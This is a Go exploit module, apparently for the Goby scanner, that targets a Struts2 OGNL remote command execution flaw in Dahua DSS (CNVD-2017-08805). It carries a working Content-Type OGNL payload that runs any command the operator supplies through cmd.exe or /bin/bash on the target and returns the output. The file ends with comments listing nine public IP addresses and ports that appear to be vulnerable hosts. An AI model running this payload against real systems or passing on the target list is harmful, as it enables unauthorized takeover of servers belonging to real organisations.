package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS RCE (CNVD-2017-08805)",
    "Description": "Dahua DSS-Safe City uses Apache Struts 2 as the website application framework. Because the application framework has a remote command execution vulnerability, an attacker can trigger the vulnerability by modifying the Content-Type value in the HTTP request header when uploading a file, and then execute it. System commands to obtain server permissions.",
    "Product": "Dahua-DSS",
    "Homepage": "http://www.dahuatech.com/product_detail-1471.html",
    "DisclosureDate": "2021-06-08",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "app=\"Dahua-DSS\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute arbitrary commands on the server and write into the backdoor, thereby invading the server and obtaining the server's administrator rights.</p>",
    "Recommendation": "<p>1. Dahua officials have fixed the vulnerability. The system is a commercial product. Contact Dahua local technical support personnel or Dahua Security Emergency Response Center DHCC to obtain the patch: cybersecurity@dahuatech.com</p><p>2. If it is not necessary, prohibit the device from connecting to the Internet.</p><p>3. Strictly filter the data entered by the user and prohibit the execution of system commands.</p>",
    "References": [
        "http://www.cnvd.org.cn/flaw/show/CNVD-2017-08805"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "uname -a"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10219"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			maxNumber := rand.Intn(10000000)
			minNumber := rand.Intn(100000)
			sumNumber := maxNumber + minNumber
			cfgGet := httpclient.NewPostRequestConfig("/portal/login_init.action")
			cfgGet.Header.Store("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='expr "+strconv.Itoa(maxNumber)+" + "+strconv.Itoa(minNumber)+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
			cfgGet.VerifyTls = false
			respPortal, _ := httpclient.DoHttpRequest(u, cfgGet)
			if respPortal.StatusCode == 200 && strings.Contains(respPortal.Utf8Html, strconv.Itoa(sumNumber)) {
				return true
			}
			cfgGetAdmin := httpclient.NewPostRequestConfig("/admin/login_login.action")
			cfgGetAdmin.Header.Store("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='expr "+strconv.Itoa(maxNumber)+" + "+strconv.Itoa(minNumber)+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
			cfgGetAdmin.VerifyTls = false
			respAdmin, _ := httpclient.DoHttpRequest(u, cfgGetAdmin)
			if respAdmin.StatusCode == 200 && strings.Contains(respAdmin.Utf8Html, strconv.Itoa(sumNumber)) {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cfgGet := httpclient.NewPostRequestConfig("/portal/login_init.action")
			cfgGet.Header.Store("Content-Type", fmt.Sprintf("%%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%s').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", cmd))
			cfgGet.VerifyTls = false
			respPortal, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			if respPortal.StatusCode == 200 && err == nil {
				expResult.Success = true
				expResult.Output = respPortal.Utf8Html
				return expResult
			}
			cfgGetAdmin := httpclient.NewPostRequestConfig("/admin/login_login.action")
			cfgGetAdmin.Header.Store("Content-Type", fmt.Sprintf("%%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='%s').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", cmd))
			cfgGetAdmin.VerifyTls = false
			respAdmin, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGetAdmin)
			if respAdmin.StatusCode == 200 && err == nil {
				expResult.Success = true
				expResult.Output = respAdmin.Utf8Html
			}
			return expResult
		},
	))
}

// 61.161.246.130:900
// 106.120.201.124:10000
// 219.135.132.243:8500
// 219.138.55.30:8090
// 112.12.4.155:9999
// 118.180.166.214:8009
// 218.56.166.170:37777
// 121.11.160.147:8009
// 36.154.26.26:8008
